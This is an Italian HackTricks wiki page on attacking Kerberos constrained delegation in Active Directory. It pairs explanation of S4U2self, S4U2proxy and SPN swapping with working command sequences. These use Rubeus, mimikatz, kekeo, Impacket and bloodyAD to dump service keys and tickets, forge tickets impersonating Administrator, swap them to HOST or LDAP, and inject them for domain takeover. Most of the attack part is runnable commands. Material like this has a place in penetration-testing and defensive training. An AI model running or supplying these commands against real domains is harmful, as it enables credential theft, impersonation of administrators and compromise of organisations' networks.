# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Un Domain admin può **consentire** a un computer di **impersonare un utente o un computer** nei confronti di qualsiasi **service** di una macchina.

- **Service for User to self (_S4U2self_):** Qualsiasi **service account che possiede un SPN** può solitamente ottenere un TGS verso se stesso per conto di un utente arbitrario. Se l'account dispone anche di [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_, quel TGS è **forwardable**, caratteristica che rende il protocol transition direttamente utile per la **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Un **service account** può ottenere un TGS per conto di un utente verso gli SPN elencati in **msDS-AllowedToDelegateTo**. L'evidence ticket utilizzato in S4U2Proxy deve essere un ticket **forwardable** verso il servizio delegante: un ticket reale client-to-service catturato dalla vittima oppure uno generato con **S4U2Self + T2A4D**.

**Nota**: Se un utente è contrassegnato in AD come ‘_Account is sensitive and cannot be delegated_’, oppure è membro di **Protected Users**, solitamente **non sarà possibile impersonarlo** tramite constrained delegation. Nei domini moderni, quando si prendono di mira account abilitati per la delegation, è preferibile usare materiale **AES** invece di presupporre l'utilizzo esclusivo di RC4.

Ciò significa che, se **comprometti l'hash del service**, puoi **impersonare gli utenti** e ottenere **accesso** per loro conto a qualsiasi **service** sulle macchine indicate (possibile **privesc**).

Inoltre, **non avrai accesso soltanto al servizio che l'utente è in grado di impersonare, ma anche a qualsiasi altro service**, perché l'SPN (il nome del servizio richiesto) non viene verificato (nel ticket questa parte non è cifrata né firmata). Pertanto, se hai accesso al **CIFS service**, puoi ottenere accesso anche al **HOST service** usando, ad esempio, il flag `/altservice` in Rubeus. La stessa debolezza dello SPN swapping viene sfruttata da **Impacket getST -altservice** e da altri strumenti.

Inoltre, l'**accesso al servizio LDAP su un DC** è ciò che serve per sfruttare un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Nota per l'operatore:** non fidarti delle sole schermate di **ADUC** o BloodHound per la revisione di **gMSA/sMSA**. Questi account spesso nascondono la consueta scheda Delegation, quindi enumera direttamente gli attributi grezzi **`userAccountControl`** e **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Se l'account compromesso dispone di **T2A4D**, di solito puoi completare l'intera catena **`S4U2Self -> S4U2Proxy`** usando soltanto la service key/TGT.<sup>[[2]](#references)</sup>

Se dispone solo di **`msDS-AllowedToDelegateTo`** (la modalità classica **"Use Kerberos only"**), la delega può comunque essere abusata, ma l'evidence ticket per S4U2Proxy deve essere un **vero ticket forwardable user-to-service** per il servizio delegante. In pratica, ciò significa sottrarre o catturare un TGS della vittima da **LSASS/ccache** e passarlo alla seconda fase (`/tgs:` in Rubeus). Un ticket S4U2Self **non-forwardable** non è sufficiente per la classic constrained delegation; se questo è il tuo unico evidence ticket, verifica invece [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Note sulla constrained delegation cross-domain (2025+)

A partire da **Windows Server 2012/2012 R2**, il KDC supporta la constrained delegation tra domini/foreste tramite le estensioni S4U2Proxy. Le build moderne (Windows Server 2016–2025) mantengono questo comportamento e aggiungono due SID PAC per segnalare il protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) quando l'utente si è autenticato normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) quando un servizio ha attestato l'identità tramite protocol transition.

Quando viene usato il protocol transition tra domini, aspettati **`SERVICE_ASSERTED_IDENTITY`** all'interno del PAC: ciò conferma che il passaggio S4U2Proxy è riuscito.<sup>[[1]](#references)</sup>

### Strumenti Impacket / Linux (altservice & full S4U)

Le versioni recenti di Impacket (0.11.x+) espongono la stessa catena S4U e lo SPN swapping di Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Se preferisci effettuare prima il forging dell'ST dell'utente (ad esempio, disponendo solo dell'hash offline), combina **ticketer.py** con **getST.py** per S4U2Proxy. **tgssub.py** è utile anche quando hai già un ccache funzionante e devi solo sostituire la service class per lo stesso host. Consulta l'issue #1713 aperto di Impacket per conoscere i problemi attuali (KRB_AP_ERR_MODIFIED quando l'ST forgiato non corrisponde alla chiave dello SPN).<sup>[[2]](#references)</sup>

### Automatizzare la configurazione della delegation da credenziali a bassi privilegi

Se disponi già di **GenericAll/WriteDACL** su un computer o un service account, puoi impostare da remoto gli attributi richiesti senza RSAT usando **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Questo consente di creare un percorso di constrained delegation per la privesc senza privilegi DA non appena puoi scrivere tali attributi.

- Step 1: **Ottieni il TGT del servizio autorizzato**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Esistono **altri modi per ottenere un TGT ticket** oppure **RC4** o **AES256** senza essere SYSTEM nel computer, come Printer Bug, unconstrain delegation, NTLM relaying e Active Directory Certificate Service abuse
>
> **È sufficiente avere quel TGT ticket (o l'hash) per eseguire questo attacco senza compromettere l'intero computer.**

- Step2: **Ottieni il TGS per il servizio impersonando l'utente**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Ulteriori informazioni su ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) e [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## Riferimenti

- [1] [Panoramica della delega vincolata Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abuso della delega con Impacket (Parte 2): delega vincolata (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Delega vincolata Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity ha ucciso il dominio: una panoramica offensiva di Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
